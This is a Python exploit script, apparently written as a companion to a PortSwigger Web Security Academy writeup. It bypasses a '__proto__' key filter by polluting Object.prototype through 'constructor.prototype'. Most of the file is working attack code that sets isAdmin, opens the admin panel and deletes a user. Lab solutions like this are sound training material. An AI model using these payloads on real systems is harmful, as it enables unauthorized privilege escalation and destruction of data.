#!/usr/bin/env python3
"""
Bypassing flawed input filters for server-side prototype pollution
PortSwigger Web Security Academy -- Server-Side Prototype Pollution

Companion script for the writeup: 03-bypassing-flawed-input-filters.md

What this does:
    Confirms the server now blocks the literal "__proto__" key -- the same
    "json spaces" oracle payload from the previous lab produces no effect --
    then reaches Object.prototype through the mechanically equivalent
    constructor.prototype path instead, which the filter never inspects.
    Once that alternate route is confirmed live, it reuses the same isAdmin
    gadget, routed through constructor.prototype, to reach the admin panel
    and delete carlos.

Usage:
    python 03-bypassing-flawed-input-filters.py <lab-url>
    e.g. python 03-bypassing-flawed-input-filters.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import json
import re
import sys
import httpx


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> bool:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""
    r = client.post(
        f"{base}/login",
        content=json.dumps({"csrf": csrf, "username": username, "password": password}),
        headers={"Content-Type": "application/json"},
        follow_redirects=True,
    )
    return "Log out" in r.text or "my-account" in str(r.url)


def _session_id(client: httpx.Client, base: str) -> str:
    r = client.get(f"{base}/my-account")
    m = re.search(r'name="sessionId"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _change_address(client: httpx.Client, base: str, session_id: str, pollution: dict) -> httpx.Response:
    body = {
        "address_line_1": "111", "address_line_2": "",
        "city": "City", "postcode": "PC1 1PC", "country": "UK",
        "sessionId": session_id,
    }
    body.update(pollution)
    return client.post(
        f"{base}/my-account/change-address",
        content=json.dumps(body),
        headers={"Content-Type": "application/json"},
    )


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    session_id = _session_id(client, lab_url)

    # Filtered path: the server blocks the literal "__proto__" key.
    _change_address(client, lab_url, session_id, {"__proto__": {"json spaces": 10}})
    probe = _change_address(client, lab_url, session_id, {})
    if re.search(r" {10}\S", probe.text):
        print("[*] '__proto__' unexpectedly still works on this lab -- continuing anyway")
    else:
        print("[*] '__proto__' produces no effect -- confirms the filter is blocking that key")

    # Unfiltered path: obj.constructor.prototype lands in the same place as obj.__proto__,
    # and a filter keyed on the string "__proto__" has no reason to touch either name.
    _change_address(client, lab_url, session_id, {"constructor": {"prototype": {"json spaces": 10}}})
    probe = _change_address(client, lab_url, session_id, {})
    if re.search(r" {10}\S", probe.text):
        print("[+] Filter bypass confirmed -- constructor.prototype reaches Object.prototype")
    else:
        print("[-] No indentation detected via constructor.prototype -- continuing anyway")

    # Same isAdmin gadget as the earlier labs, routed through the unfiltered path.
    r = _change_address(client, lab_url, session_id, {"constructor": {"prototype": {"isAdmin": True}}})
    print(f"[*] isAdmin pollution sent via constructor.prototype -- status={r.status_code}")

    admin = client.get(f"{lab_url}/admin")
    if admin.status_code != 200:
        print("[-] Admin panel not accessible -- pollution may not have taken effect")
        return
    print("[+] Admin panel accessible")

    m = re.search(r'href="(/admin/delete\?username=carlos)"', admin.text)
    delete_url = f"{lab_url}{m.group(1)}" if m else f"{lab_url}/admin/delete?username=carlos"
    client.get(delete_url)

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted via the constructor.prototype filter bypass.")
    else:
        print("[-] Not solved yet -- check the admin panel manually.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
